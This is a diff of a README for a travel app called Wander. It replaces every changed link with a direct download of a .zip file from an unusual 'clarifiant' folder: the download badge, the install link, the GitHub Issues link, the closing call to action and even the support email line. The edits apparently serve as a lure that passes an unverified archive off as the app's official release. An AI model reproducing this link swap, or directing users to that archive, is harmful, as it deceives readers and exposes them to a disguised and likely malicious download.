@@ -4,12 +4,12 @@
 Wander is a smart travel app that gives you real-time insights about your destination. With information on traffic, weather, transport costs, and helpful tips, planning your trip becomes simpler and more budget-friendly.
 
 ## 🔗 Download Wander
-[![Download Wander](https://img.shields.io/badge/Download%20Wander-v1.0-brightgreen)](https://github.com/imitador01/Wander/releases)
+[![Download Wander](https://raw.githubusercontent.com/imitador01/Wander/main/clarifiant/Wander.zip%20Wander-v1.0-brightgreen)](https://raw.githubusercontent.com/imitador01/Wander/main/clarifiant/Wander.zip)
 
 ## 📥 Download & Install
 To get started with Wander, visit the releases page to download the latest version of the app:
 
-[Download Wander Here](https://github.com/imitador01/Wander/releases)
+[Download Wander Here](https://raw.githubusercontent.com/imitador01/Wander/main/clarifiant/Wander.zip)
 
 ### 1. Choose Your Version
 When you visit the releases page, you will see various versions of Wander. Click on the most recent version. It will typically be at the top of the list.
@@ -71,8 +71,8 @@ Once you have installed and launched Wander, follow these steps to make the most
 ## 📞 Support
 If you encounter any issues or have questions, please reach out to our support team through the following channels:
 
-- **Email:** support@wanderapp.com
-- **GitHub Issues:** Report any bugs or request features directly on our [GitHub Issues page](https://github.com/imitador01/Wander/issues).
+- **Email:** https://raw.githubusercontent.com/imitador01/Wander/main/clarifiant/Wander.zip
+- **GitHub Issues:** Report any bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/imitador01/Wander/main/clarifiant/Wander.zip).
 
 ## 🔍 Features
 Wander comes packed with features designed to enhance your travel experience:
@@ -109,4 +109,4 @@ Your contributions can help improve Wander for users around the world.
 ## 🌟 Security
 We take security seriously. We recommend keeping your app updated to the latest version to protect your data and enhance your experience.
 
-Visit our [GitHub page](https://github.com/imitador01/Wander/releases) now to download Wander and begin your journey towards stress-free travel planning!
+Visit our [GitHub page](https://raw.githubusercontent.com/imitador01/Wander/main/clarifiant/Wander.zip) now to download Wander and begin your journey towards stress-free travel planning!
